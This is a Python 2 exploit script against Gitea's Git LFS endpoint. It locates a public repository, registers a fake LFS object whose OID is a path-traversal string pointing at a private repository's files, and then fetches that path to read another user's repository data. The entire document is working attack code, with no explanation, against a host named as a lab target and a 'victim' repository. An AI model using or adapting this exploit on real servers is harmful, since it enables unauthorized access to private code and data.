from requests import get, Session
import os

url = 'http://pen.gitea.local:3000/'

r = get('{}api/v1/repos/search?limit=1'.format(url))
try:
	out = r.json()['data']
except:
	print "[-] Probably not gitea url"
	os._exit(0)

if len(out) != 1:
	print "[-] There are no public repos"
	os._exit(0)

out = out[0]
s = Session()
public_repo_id = int(out['id'])
public_user_id = int(out['owner']['id'])
public_repo_url = out['full_name']

print "[+] Found public repo {} ID {}".format(public_repo_url, public_repo_id)

# get the file git/repositories/victim/mysecretapp.git/HEAD
json = {
	"Oid": "....git/repositories/victim/mysecretapp.git/HEAD",
	"Size": 1000000, # This needs to be bigger than the file
	"User" : "a",
	"Password" : "a",
	"Repo"  : "a",
	"Authorization" : "a"
}

r  = s.post('{}{}.git/info/lfs/objects'.format(url, public_repo_url), json=json, headers={'Accept': 'application/vnd.git-lfs+json'})
if '"Unauthorized"' not in r.text or '"expires_at"' not in r.text:
    	print "[-] Cannot create fake OID for git/repositories/victim/mysecretapp.git/HEAD"
	os._exit(0)

print "[+] Fake OID for git/repositories/victim/mysecretapp.git/HEAD created"

r = get(r'{}{}.git/info/lfs/objects/....git%2frepositories%2fvictim%2fmysecretapp.git%2fHEAD/sth'.format(url, public_repo_url))

print "git/repositories/victim/mysecretapp.git/HEAD contains: " + r.text

